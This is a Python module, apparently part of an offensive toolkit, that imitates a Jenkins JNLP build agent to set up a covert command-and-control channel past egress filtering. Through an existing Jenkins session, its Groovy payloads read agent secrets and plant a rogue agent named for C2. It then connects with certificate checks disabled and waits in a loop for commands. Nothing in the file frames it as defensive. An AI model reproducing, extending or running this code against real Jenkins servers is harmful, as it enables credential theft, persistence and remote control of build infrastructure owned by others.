"""JNLP agent emulation for covert C2 communication.

Implements Jenkins JNLP (Java Network Launch Protocol) agent spoofing
to establish command and control channels using legitimate Jenkins protocols,
bypassing firewall egress filtering.
"""

import socket
import ssl
import struct
from dataclasses import dataclass
from enum import Enum
from typing import Any, Optional


class JNLPProtocolVersion(Enum):
    """JNLP protocol versions."""
    JNLP1 = "JNLP-connect"
    JNLP2 = "JNLP2-connect"
    JNLP3 = "JNLP3-connect"
    JNLP4 = "JNLP4-connect"


@dataclass
class JNLPAgentConfig:
    """Configuration for JNLP agent emulation."""
    jenkins_url: str
    agent_name: str
    secret: str
    tunnel_host: Optional[str] = None
    tunnel_port: int = 50000
    use_websocket: bool = False
    protocol_version: JNLPProtocolVersion = JNLPProtocolVersion.JNLP4


@dataclass
class JNLPConnectionResult:
    """Result of JNLP connection attempt."""
    success: bool
    protocol_version: Optional[JNLPProtocolVersion] = None
    connection_info: Optional[str] = None
    error: Optional[str] = None


class JNLPAgent:
    """JNLP agent emulator for covert C2."""

    def __init__(self, config: JNLPAgentConfig):
        """Initialize JNLP agent.

        Args:
            config: JNLP agent configuration
        """
        self.config = config
        self.socket: Optional[socket.socket] = None
        self.connected = False

    def _extract_host_port(self, url: str) -> tuple[str, int]:
        """Extract host and port from Jenkins URL.

        Args:
            url: Jenkins URL

        Returns:
            Tuple of (host, port)
        """
        url = url.replace("http://", "").replace("https://", "")

        if ":" in url:
            parts = url.split(":")
            host = parts[0]
            port_part = parts[1].split("/")[0]
            port = int(port_part)
        else:
            host = url.split("/")[0]
            port = 443 if "https" in self.config.jenkins_url else 80

        return host, port

    def get_agent_secret(self, session: Any, agent_name: str) -> Optional[str]:
        """Retrieve JNLP secret for an agent.

        Args:
            session: Jenkins session
            agent_name: Agent name

        Returns:
            Agent secret if found
        """
        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.slaves.SlaveComputer

def jenkins = Jenkins.getInstance()
def computer = jenkins.getComputer('{agent_name}')

if (computer == null) {{
    println "ERROR:Agent not found"
    return
}}

if (computer instanceof SlaveComputer) {{
    def jnlpMac = computer.getJnlpMac()
    println "SECRET:" + jnlpMac
}} else {{
    println "ERROR:Not a JNLP agent"
}}
"""

        result = session.execute_groovy(groovy_code)

        for line in result.split('\n'):
            if line.startswith("SECRET:"):
                return line[7:].strip()

        return None

    def create_fake_agent(self, session: Any, agent_name: str) -> tuple[bool, Optional[str]]:
        """Create a fake JNLP agent in Jenkins.

        Args:
            session: Jenkins session
            agent_name: Name for fake agent

        Returns:
            Tuple of (success, secret)
        """
        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.slaves.DumbSlave
import hudson.slaves.JNLPLauncher
import hudson.slaves.RetentionStrategy

def jenkins = Jenkins.getInstance()

try {{
    def slave = new DumbSlave(
        '{agent_name}',
        '/tmp/jenkins',
        new JNLPLauncher()
    )

    slave.setNumExecutors(1)
    slave.setLabelString('fake-agent c2')
    slave.setRetentionStrategy(new RetentionStrategy.Always())

    jenkins.addNode(slave)

    def computer = jenkins.getComputer('{agent_name}')
    def secret = computer.getJnlpMac()

    println "SUCCESS:Agent created"
    println "SECRET:" + secret
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        result = session.execute_groovy(groovy_code)

        if "SUCCESS" not in result:
            return False, None

        for line in result.split('\n'):
            if line.startswith("SECRET:"):
                return True, line[7:].strip()

        return False, None

    def connect_jnlp4(self) -> JNLPConnectionResult:
        """Connect using JNLP4 protocol.

        Returns:
            JNLPConnectionResult
        """
        try:
            if self.config.tunnel_host:
                host = self.config.tunnel_host
                port = self.config.tunnel_port
            else:
                host, base_port = self._extract_host_port(self.config.jenkins_url)
                port = self.config.tunnel_port

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if "https" in self.config.jenkins_url:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))

            preamble = b"JNLP4-connect"
            sock.sendall(preamble)

            headers = {
                "Agent-Name": self.config.agent_name,
                "Secret": self.config.secret,
                "Protocol": "JNLP4-connect"
            }

            for key, value in headers.items():
                header_line = f"{key}: {value}\r\n".encode()
                sock.sendall(header_line)

            sock.sendall(b"\r\n")

            sock.recv(1024)

            self.socket = sock
            self.connected = True

            return JNLPConnectionResult(
                success=True,
                protocol_version=JNLPProtocolVersion.JNLP4,
                connection_info=f"Connected to {host}:{port} as {self.config.agent_name}"
            )

        except Exception as e:
            return JNLPConnectionResult(
                success=False,
                error=str(e)
            )

    def send_command(self, command: str) -> Optional[str]:
        """Send command through JNLP channel.

        Args:
            command: Command to send

        Returns:
            Response if available
        """
        if not self.connected or not self.socket:
            return None

        try:
            cmd_bytes = command.encode()
            length = struct.pack(">I", len(cmd_bytes))

            self.socket.sendall(length + cmd_bytes)

            response_length_bytes = self.socket.recv(4)
            if len(response_length_bytes) < 4:
                return None

            response_length = struct.unpack(">I", response_length_bytes)[0]

            response = b""
            while len(response) < response_length:
                chunk = self.socket.recv(min(4096, response_length - len(response)))
                if not chunk:
                    break
                response += chunk

            return response.decode()

        except Exception:
            return None

    def disconnect(self) -> None:
        """Disconnect JNLP connection."""
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.socket = None
            self.connected = False

    def establish_c2_channel(self,
                            c2_callback: Optional[callable] = None,
                            max_duration: int = 3600) -> None:
        """Establish persistent C2 channel via JNLP.

        Args:
            c2_callback: Optional callback function for received commands
            max_duration: Maximum duration in seconds
        """
        import time

        if not self.connected:
            result = self.connect_jnlp4()
            if not result.success:
                return

        start_time = time.time()

        while time.time() - start_time < max_duration:
            try:
                if not self.socket:
                    break

                self.socket.settimeout(5.0)

                try:
                    length_bytes = self.socket.recv(4)
                    if len(length_bytes) < 4:
                        continue

                    msg_length = struct.unpack(">I", length_bytes)[0]

                    if msg_length > 1024 * 1024:
                        continue

                    message = b""
                    while len(message) < msg_length:
                        chunk = self.socket.recv(min(4096, msg_length - len(message)))
                        if not chunk:
                            break
                        message += chunk

                    if c2_callback and len(message) == msg_length:
                        c2_callback(message.decode())

                except socket.timeout:
                    continue

            except Exception:
                break

        self.disconnect()


class JNLPWebSocketAgent:
    """JNLP agent using WebSocket transport."""

    def __init__(self, config: JNLPAgentConfig):
        """Initialize WebSocket JNLP agent.

        Args:
            config: JNLP configuration
        """
        self.config = config
        self.ws = None

    def connect(self) -> JNLPConnectionResult:
        """Connect via WebSocket.

        Returns:
            JNLPConnectionResult
        """
        try:
            import websocket
        except ImportError:
            return JNLPConnectionResult(
                success=False,
                error="websocket-client library not available"
            )

        try:
            host, port = self._extract_host_port(self.config.jenkins_url)

            ws_url = f"ws://{host}:{port}/wsagents/"

            if "https" in self.config.jenkins_url:
                ws_url = f"wss://{host}:{port}/wsagents/"

            headers = {
                "Agent-Name": self.config.agent_name,
                "Secret": self.config.secret
            }

            self.ws = websocket.create_connection(
                ws_url,
                header=headers,
                timeout=10
            )

            return JNLPConnectionResult(
                success=True,
                protocol_version=JNLPProtocolVersion.JNLP4,
                connection_info=f"WebSocket connected to {ws_url}"
            )

        except Exception as e:
            return JNLPConnectionResult(
                success=False,
                error=str(e)
            )

    def _extract_host_port(self, url: str) -> tuple[str, int]:
        """Extract host and port from URL."""
        url = url.replace("http://", "").replace("https://", "")

        if ":" in url:
            parts = url.split(":")
            host = parts[0]
            port_part = parts[1].split("/")[0]
            port = int(port_part)
        else:
            host = url.split("/")[0]
            port = 443 if "https" in self.config.jenkins_url else 80

        return host, port


def create_jnlp_agent(session: Any,
                     jenkins_url: str,
                     agent_name: str = "build-agent-01") -> tuple[bool, Optional[JNLPAgentConfig]]:
    """Create and configure JNLP agent for C2.

    Args:
        session: Jenkins session
        jenkins_url: Jenkins URL
        agent_name: Agent name

    Returns:
        Tuple of (success, JNLPAgentConfig)
    """
    agent = JNLPAgent(JNLPAgentConfig(
        jenkins_url=jenkins_url,
        agent_name=agent_name,
        secret=""
    ))

    success, secret = agent.create_fake_agent(session, agent_name)

    if success and secret:
        config = JNLPAgentConfig(
            jenkins_url=jenkins_url,
            agent_name=agent_name,
            secret=secret
        )
        return True, config

    return False, None


def establish_jnlp_c2(config: JNLPAgentConfig,
                     c2_callback: Optional[callable] = None) -> JNLPConnectionResult:
    """Quick function to establish JNLP C2 channel.

    Args:
        config: JNLP agent configuration
        c2_callback: Callback for received commands

    Returns:
        JNLPConnectionResult
    """
    agent = JNLPAgent(config)
    result = agent.connect_jnlp4()

    if result.success and c2_callback:
        agent.establish_c2_channel(c2_callback)

    return result
